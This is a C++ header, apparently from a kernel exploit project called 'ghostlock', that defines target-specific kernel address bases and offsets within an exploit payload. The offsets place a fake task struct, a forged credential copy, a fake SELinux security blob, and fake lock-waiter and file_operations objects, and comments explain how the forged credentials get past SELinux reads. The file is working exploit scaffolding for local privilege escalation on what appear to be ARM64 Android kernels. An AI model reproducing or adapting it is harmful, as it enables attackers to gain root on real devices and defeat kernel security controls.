#ifndef GHOSTLOCK_TARGET_CONSTANTS_HPP
#define GHOSTLOCK_TARGET_CONSTANTS_HPP

#include <cstddef>
#include <cstdint>
#include <limits>
#include <optional>
#include <type_traits>

namespace ghostlock::target {

namespace address {

inline constexpr std::uintptr_t kImageTextBase = 0xffffffc080000000ULL;
inline constexpr std::uintptr_t kMtkVirtualBase = 0xffffffc000000000ULL;
inline constexpr std::uintptr_t kPageOffset = 0xffffff8000000000ULL;
inline constexpr std::uintptr_t kPhysicalOffset = 0x80000000ULL;
inline constexpr std::uintptr_t kKernelSnitchIdentityStart =
    0xffffff8000000000ULL;
inline constexpr std::uintptr_t kKernelSnitchIdentityEnd =
    0xffffff8c00000000ULL;
inline constexpr std::uintptr_t kDirectMapBase = 0xffffff8000000000ULL;
inline constexpr std::uintptr_t kDirectMapEnd = 0xffffff9000000000ULL;
inline constexpr std::uintptr_t kVmemmapStart = 0xfffffffe00000000ULL;

}  // namespace address

namespace payload {

inline constexpr std::size_t kLockOffset = 0x0e80;
inline constexpr std::size_t kWaiterOffset = 0x1180;
inline constexpr std::size_t kFileOperationsOffset = 0x0f80;
inline constexpr std::size_t kRightNodeOffset = 0x1240;
inline constexpr std::size_t kLeftNodeOffset = 0x1260;
inline constexpr std::size_t kFakeTaskOffset = 0x1280;
inline constexpr std::size_t kCredentialCopyOffset = 0x1080;
/* Fake `struct task_security_struct` for the forged credential copy, relative to
 * the copy itself: the copy's `security` field must point at a *mapped* blob
 * whose sid is a real SID, because selinux_* reads tsec->sid even under
 * permissive mode (only the verdict is skipped, not the read).  It sits in the
 * gap between the credential copy (0x1080 + 0xb0 = 0x1130) and the waiter
 * (0x1180), so it holds for the TCP copy offset (0x6800 + 0xb0 = 0x68b0) too. */
inline constexpr std::size_t kCredSecurityBlobDelta = 0xc0;
inline constexpr std::size_t kTcpFakeTaskOffset = 0x5800;
inline constexpr std::size_t kTcpCredentialCopyOffset = 0x6800;

}  // namespace payload

template <typename Domain>
class KernelAddress final {
 public:
  constexpr KernelAddress() noexcept = default;
  explicit constexpr KernelAddress(std::uintptr_t value) noexcept
      : value_(value) {}

  [[nodiscard]] constexpr std::uintptr_t value() const noexcept {
    return value_;
  }

  [[nodiscard]] constexpr std::optional<KernelAddress> checked_add(
      std::uintptr_t offset) const noexcept {
    if (offset > std::numeric_limits<std::uintptr_t>::max() - value_) {
      return std::nullopt;
    }
    return KernelAddress(value_ + offset);
  }

  friend constexpr bool operator==(KernelAddress, KernelAddress) = default;

 private:
  std::uintptr_t value_ = 0;
};

struct ImageAddressDomain final {};
struct DirectMapAddressDomain final {};
struct PhysicalAddressDomain final {};

using KernelImageAddress = KernelAddress<ImageAddressDomain>;
using DirectMapAddress = KernelAddress<DirectMapAddressDomain>;
using PhysicalAddress = KernelAddress<PhysicalAddressDomain>;

static_assert(std::is_standard_layout_v<KernelImageAddress>);
static_assert(std::is_trivially_copyable_v<KernelImageAddress>);
static_assert(sizeof(KernelImageAddress) == sizeof(std::uintptr_t));
static_assert(alignof(KernelImageAddress) == alignof(std::uintptr_t));

static_assert(address::kImageTextBase == 0xffffffc080000000ULL);
static_assert(address::kMtkVirtualBase == 0xffffffc000000000ULL);
static_assert(address::kPageOffset == address::kDirectMapBase);
static_assert(address::kKernelSnitchIdentityStart == address::kDirectMapBase);
static_assert(address::kKernelSnitchIdentityEnd < address::kDirectMapEnd);
static_assert(payload::kLockOffset == 0x0e80);
static_assert(payload::kFileOperationsOffset == 0x0f80);
static_assert(payload::kCredentialCopyOffset == 0x1080);
static_assert(payload::kWaiterOffset == 0x1180);
static_assert(payload::kRightNodeOffset == 0x1240);
static_assert(payload::kLeftNodeOffset == 0x1260);
static_assert(payload::kFakeTaskOffset == 0x1280);
static_assert(payload::kTcpFakeTaskOffset == 0x5800);
static_assert(payload::kTcpCredentialCopyOffset == 0x6800);
/* The security-blob slot must stay outside the credential copy (whose profile
 * size is 0xb0 here) and below the waiter. */
static_assert(payload::kCredSecurityBlobDelta >= 0xb0);
static_assert(payload::kCredentialCopyOffset + payload::kCredSecurityBlobDelta + 8 <=
              payload::kWaiterOffset);

}  // namespace ghostlock::target

#endif
